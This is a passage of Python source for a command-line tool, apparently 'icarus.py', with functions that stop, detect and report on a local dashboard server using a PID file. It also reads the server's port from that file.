        server.serve_forever()
    except KeyboardInterrupt:
        console.print("\n[yellow]Dashboard stopped[/yellow]")
    finally:
        if PID_FILE.exists():
            PID_FILE.unlink()


def stop_dashboard():
    """Stop the dashboard server."""
    if not PID_FILE.exists():
        console.print("[yellow]Dashboard is not running[/yellow]")
        return
    
    try:
        data = json.loads(PID_FILE.read_text())
        pid = data.get("pid")
        
        if sys.platform == "win32":
            os.system(f"taskkill /F /PID {pid}")
        else:
            os.kill(pid, signal.SIGTERM)
        
        PID_FILE.unlink()
        console.print("[green]Dashboard stopped[/green]")
    except Exception as e:
        console.print(f"[red]Error stopping dashboard: {e}[/red]")
        if PID_FILE.exists():
            PID_FILE.unlink()


def is_dashboard_running() -> bool:
    """Check if dashboard is running."""
    if not PID_FILE.exists():
        return False
    
    try:
        data = json.loads(PID_FILE.read_text())
        pid = data.get("pid")
        
        # Check if process exists
        if sys.platform == "win32":
            result = os.system(f"tasklist /FI \"PID eq {pid}\" 2>NUL | find /I \"{pid}\" >NUL")
            return result == 0
        else:
            os.kill(pid, 0)
            return True
    except Exception:
        return False


def get_running_port() -> int:
    """Get port of running dashboard."""
    try:
        if PID_FILE.exists():
            data = json.loads(PID_FILE.read_text())
            return data.get("port", 8080)
    except Exception:
        pass
    return 8080


def dashboard_status():
    """Show dashboard status."""
    if is_dashboard_running():
        port = get_running_port()
        console.print(f"[green]Dashboard is running[/green]")
        console.print(f"[cyan]URL: http://localhost:{port}[/cyan]")
    else:
        console.print("[yellow]Dashboard is not running[/yellow]")
        console.print("[dim]Start with: python icarus.py dashboard[/dim]")
